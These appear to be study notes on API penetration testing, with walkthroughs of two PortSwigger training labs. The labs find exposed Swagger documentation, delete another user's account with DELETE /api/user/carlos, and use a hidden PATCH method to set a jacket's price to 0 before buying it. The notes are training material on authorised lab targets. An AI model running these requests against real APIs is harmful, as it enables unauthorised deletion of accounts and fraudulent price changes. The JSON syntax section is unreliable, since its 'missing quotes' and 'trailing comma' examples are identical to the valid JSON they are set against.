# API Testing

## API Reconnaissance

API reconnaissance (recon) is the process of gathering information about an API to identify its attack surface before testing.

### Goals

- Identify API endpoints
- Understand how endpoints interact with resources
- Discover supported HTTP methods
- Identify required and optional parameters
- Determine authentication mechanisms
- Discover rate limits
- Locate API documentation

### Example Endpoint

Request:

```http
GET /api/books HTTP/1.1
Host: example.com
```

Endpoint:

```text
/api/books
```

Possible related endpoints:

```text
/api/books/mystery
/api/books/scifi
/api/books/123
```

---

## API Documentation

API documentation explains how an API should be used.

### Types

#### Human-Readable Documentation

Designed for developers.

Usually contains:

- Endpoint descriptions
- Request examples
- Response examples
- Authentication information
- Error handling

#### Machine-Readable Documentation

Designed for software tools.

Common formats:

- JSON
- YAML
- XML

Examples:

- OpenAPI Specification
- Swagger

Benefits for attackers:

- Quickly maps attack surface
- Reveals hidden endpoints
- Shows accepted parameters
- Shows authentication requirements

---

## Discovering API Documentation

### Common Documentation Locations

```text
/api
/swagger
/swagger/index.html
/openapi.json
/openapi.yaml
/docs
/api-docs
/redoc
```

### Methodology

If an endpoint is discovered:

```text
/api/swagger/v1/users/123
```

Work backwards:

```text
/api/swagger/v1
/api/swagger
/api
```

Documentation is often exposed somewhere higher in the path hierarchy.

---

## Recon Techniques

### 1. Browse the Application

Look for:

- Account management features
- Search functionality
- Mobile-app style requests
- AJAX requests

### 2. Burp HTTP History

Observe:

- Endpoints
- Parameters
- Authentication tokens
- HTTP methods

### 3. Burp Scanner Crawl

Can automatically discover:

- API endpoints
- OpenAPI specifications
- Swagger documentation

### 4. Intruder Path Discovery

Use wordlists containing:

```text
swagger
api
docs
openapi
v1
v2
```

to discover documentation endpoints.

---

## Useful Burp Workflow

1. Browse application
2. Capture API requests
3. Send requests to Repeater
4. Manipulate paths
5. Discover higher-level endpoints
6. Search for documentation
7. Use documentation to map attack surface
8. Test authorization and access controls

---

# Lab: Discovering API Documentation

## Objective

Find exposed API documentation and delete user `carlos`.

### Credentials

```text
Username: wiener
Password: peter
```

## Solution Summary

### Step 1

Login as:

```text
wiener:peter
```

### Step 2

Update email address.

Observe request:

```http
PATCH /api/user/wiener
```

### Step 3

Send request to Repeater.

### Step 4

Modify endpoint:

```http
PATCH /api/user
```

Result:

```text
Error - user identifier missing
```

### Step 5

Move one level higher:

```http
PATCH /api
```

Result:

```text
API documentation exposed
```

### Step 6

Open documentation in browser.

### Step 7

Use interactive documentation.

Find:

```http
DELETE /api/user/{username}
```

### Step 8

Send:

```http
DELETE /api/user/carlos
```

Lab solved.

---

# Lessons Learned

## 1. Always Investigate Parent Paths

If you discover:

```text
/api/user/wiener
```

Check:

```text
/api/user
/api
```

Documentation may be exposed at a higher level.

## 2. API Documentation Can Be a Security Risk

Exposed documentation may reveal:

- Hidden endpoints
- Administrative functions
- Accepted parameters
- HTTP methods
- Authentication details

## 3. Documentation Speeds Up Testing

Instead of brute-forcing endpoints, documentation can provide a complete map of the API.

## 4. Repeater Is Essential

Repeater allows:

- Endpoint enumeration
- Method testing
- Parameter manipulation
- Authorization testing

## 5. Always Check if the parameters are properly removed or add

According to the original request (PATCH here), there's a parameter called email included in the request. Just changing PATCH to DELETE /api/user/carlos didn't work. I needed to delete email:example@gmail.com from the original request in repeater too.

---

# Common API Documentation Frameworks

| Framework  | Typical Paths       |
| ---------- | ------------------- |
| Swagger UI | /swagger            |
| Swagger UI | /swagger/index.html |
| OpenAPI    | /openapi.json       |
| OpenAPI    | /openapi.yaml       |
| ReDoc      | /redoc              |
| API Docs   | /docs               |

# Identifying API Endpoints

API documentation is useful, but should never be fully trusted. Documentation may be:

- Incomplete
- Outdated
- Misconfigured
- Missing hidden functionality

Always perform manual reconnaissance in addition to reviewing documentation.

## Endpoint Discovery Techniques

### 1. Browse the Application

While using the web application, look for:

- API requests in Burp Proxy History
- AJAX requests
- Account management features
- Search functionality
- Product pages
- Mobile application traffic

Common API patterns:

```text
/api/
/v1/
/v2/
/rest/
/graphql
```

Example:

```http
GET /api/products/3/price HTTP/1.1
```

Potential related endpoints:

```text
/api/products
/api/products/3
/api/products/3/price
/api/products/3/reviews
```

---

### 2. Analyze JavaScript Files

JavaScript often contains references to API endpoints that have not yet been accessed.

Example:

```javascript
fetch("/api/users/current");
```

Useful findings:

- Hidden endpoints
- Internal APIs
- Debug functionality
- Administrative routes

Tools:

- Burp Scanner
- JS Link Finder BApp
- Manual JavaScript review

---

### 3. Observe API Patterns

After identifying one endpoint, look for similar structures.

Example:

```text
/api/user/update
```

Potential endpoints:

```text
/api/user/delete
/api/user/create
/api/user/add
/api/user/reset-password
```

Applications often use predictable naming conventions.

---

# Interacting with API Endpoints

After discovering endpoints, interact with them using:

- Burp Repeater
- Burp Intruder

Goals:

- Understand behavior
- Discover hidden functionality
- Trigger informative errors
- Identify access control weaknesses

Pay close attention to:

- Error messages
- Status codes
- Response headers
- Supported methods

Error responses frequently reveal implementation details.

---

# Identifying Supported HTTP Methods

HTTP methods determine what actions can be performed on resources.

Common methods:

| Method  | Purpose                  |
| ------- | ------------------------ |
| GET     | Retrieve data            |
| POST    | Create data              |
| PUT     | Replace data             |
| PATCH   | Modify data              |
| DELETE  | Remove data              |
| OPTIONS | Discover allowed methods |

---

## Example REST API

```http
GET /api/tasks
```

Returns:

```json
[
  {
    "id": 1,
    "task": "Buy milk"
  }
]
```

```http
POST /api/tasks
```

Creates a new task.

```http
DELETE /api/tasks/1
```

Deletes task 1.

---

## Using OPTIONS

OPTIONS is extremely useful during recon.

Example:

```http
OPTIONS /api/products/1/price
```

Response:

```http
Allow: GET, PATCH
```

This immediately reveals additional functionality.

### Recon Workflow

1. Discover endpoint
2. Send OPTIONS request
3. Record allowed methods
4. Test each method individually

---

## Testing Alternative Methods

If an endpoint uses:

```http
GET /api/products/1/price
```

Try:

```http
POST
PUT
PATCH
DELETE
OPTIONS
```

Additional functionality may exist but not be exposed through the UI.

---

# Identifying Supported Content Types

Many APIs expect data in a specific format.

The server behavior may change depending on the Content-Type header.

Common content types:

```http
application/json
```

```http
application/xml
```

```http
application/x-www-form-urlencoded
```

```http
multipart/form-data
```

---

## Why Content Types Matter

Changing content types can:

- Trigger verbose errors
- Reveal implementation details
- Bypass filters
- Reach alternative code paths
- Expose injection vulnerabilities

Example:

A JSON parser may be secure while an XML parser is vulnerable.

---

## Content-Type Testing Methodology

### Initial Request

```http
POST /api/user
Content-Type: application/json
```

Body:

```json
{
  "name": "wiener"
}
```

### Alternative Tests

```http
Content-Type: application/xml
```

```xml
<user>
    <name>wiener</name>
</user>
```

or

```http
Content-Type: application/x-www-form-urlencoded
```

```text
name=wiener
```

Observe any differences in:

- Status codes
- Error messages
- Application behavior

---

# Lab: Exploiting a Hidden API Endpoint

## Objective

Purchase the Lightweight "l33t" Leather Jacket by exploiting hidden API functionality.

Credentials:

```text
Username: wiener
Password: peter
```

---

## Discovery Process

### Step 1

Browse a product page.

Observe API request:

```http
GET /api/products/1/price
```

---

### Step 2

Send request to Repeater.

Test:

```http
OPTIONS /api/products/1/price
```

Response:

```http
Allow: GET, PATCH
```

Discovery:

- GET is exposed
- PATCH is hidden functionality

---

### Step 3

Test PATCH

```http
PATCH /api/products/1/price
```

Response:

```text
Unauthorized
```

This indicates:

- PATCH exists
- Authentication is required

---

### Step 4

Login

```text
wiener:peter
```

Repeat request.

---

### Step 5

Send PATCH request again.

Response:

```text
Unsupported Media Type
```

Error reveals:

```http
Content-Type: application/json
```

is required.

---

### Step 6

Add JSON body

```http
PATCH /api/products/1/price
Content-Type: application/json
```

Body:

```json
{}
```

Response:

```text
Missing parameter: price
```

Useful error message reveals required input.

---

### Step 7

Supply required parameter

```json
{
  "price": 0
}
```

Request succeeds.

---

### Step 8

Reload product page.

Price becomes:

```text
$0.00
```

Add product to basket and place order.

Lab solved.

---

# Lessons Learned

## 1. Error Messages Are Recon Tools

Errors can reveal:

- Required parameters
- Expected content types
- Authentication requirements
- Internal functionality

Example:

```text
Missing parameter: price
```

directly disclosed how to construct a valid request.

---

## 2. Always Test OPTIONS

OPTIONS frequently exposes:

```text
GET
POST
PUT
PATCH
DELETE
```

that are otherwise hidden.

---

## 3. Hidden Functionality Often Exists

The UI may only use:

```http
GET
```

while the API also supports:

```http
PATCH
DELETE
POST
```

Always test alternative methods.

---

## 4. Content-Type Manipulation Is Important

Different content types may:

- Trigger different parsers
- Expose vulnerabilities
- Bypass security controls

Never assume JSON is the only supported format.

---

# Using Intruder to Find Hidden Endpoints

Suppose you discover:

```http
PUT /api/user/update
```

Use Intruder to fuzz:

```text
update
```

with common API actions:

```text
delete
remove
create
add
register
reset-password
change-password
activate
deactivate
search
export
import
admin
```

Potential discoveries:

```http
PUT /api/user/delete
POST /api/user/add
POST /api/user/reset-password
```

---

# Request Formatting and Parsing

A request may fail even if the endpoint, HTTP method, and parameters are correct.

Before an API processes business logic, the web server and application framework must successfully parse the request.

As a result, incorrect formatting can trigger errors that reveal useful information about the API.

---

## Why Request Formatting Matters

Improper request formatting may cause:

- `400 Bad Request`
- `401 Unauthorized`
- `415 Unsupported Media Type`
- `422 Unprocessable Entity`
- JSON parsing errors
- XML parsing errors

These errors often reveal:

- Expected content types
- Required parameters
- Accepted request formats
- Internal framework behavior

---

## Request Parsing Layers

A request generally passes through several validation stages:

```text
1. HTTP Request Structure
2. Headers
3. Content-Type Validation
4. Request Body Parsing
5. Parameter Validation
6. Business Logic
```

Failure at any stage may generate useful error messages.

---

## Correct JSON Request Format

Example:

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "price": 0
}
```

Important:

- Valid HTTP method
- Valid endpoint
- Correct Content-Type
- Blank line between headers and body
- Valid JSON syntax

---

## Header and Body Separation

A blank line must exist between the HTTP headers and the request body.

Correct:

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "price": 0
}
```

Incorrect:

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
Content-Type: application/json
{
    "price": 0
}
```

Without the blank line, the server may interpret the JSON as part of the headers and reject the request.

---

## Content-Type Header

The Content-Type header tells the server how to interpret the request body.

Examples:

```http
Content-Type: application/json
```

```http
Content-Type: application/xml
```

```http
Content-Type: application/x-www-form-urlencoded
```

Sometimes additional parameters are included:

```http
Content-Type: application/json; charset=utf-8
```

The semicolon separates additional content-type parameters.

---

## JSON Syntax Validation

Correct:

```json
{
  "price": 0
}
```

Incorrect (missing quotes):

```json
{
  "price": 0
}
```

Incorrect (trailing comma):

```json
{
  "price": 0
}
```

Incorrect (invalid separator):

```json
{
    "price" = 0
}
```

These often trigger parsing errors before the application logic is reached.

---

## Error-Driven Reconnaissance

Example workflow:

### Request

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
```

### Response

```text
415 Unsupported Media Type
```

Discovery:

```http
Content-Type: application/json
```

is required.

---

### Request

```http
PATCH /api/products/1/price HTTP/1.1
Host: example.com
Content-Type: application/json

{}
```

### Response

```text
Missing parameter: price
```

Discovery:

```json
{
  "price": 0
}
```

is required.

---

## API Testing Tip

When an API request fails, do not immediately assume that:

- Authentication is wrong
- Authorization is missing
- The endpoint is invalid

First verify:

- HTTP method
- Request path
- Headers
- Content-Type
- Header/body separation
- JSON/XML syntax
- Required parameters

Many PortSwigger labs intentionally rely on error messages to guide you toward constructing a valid request.

---
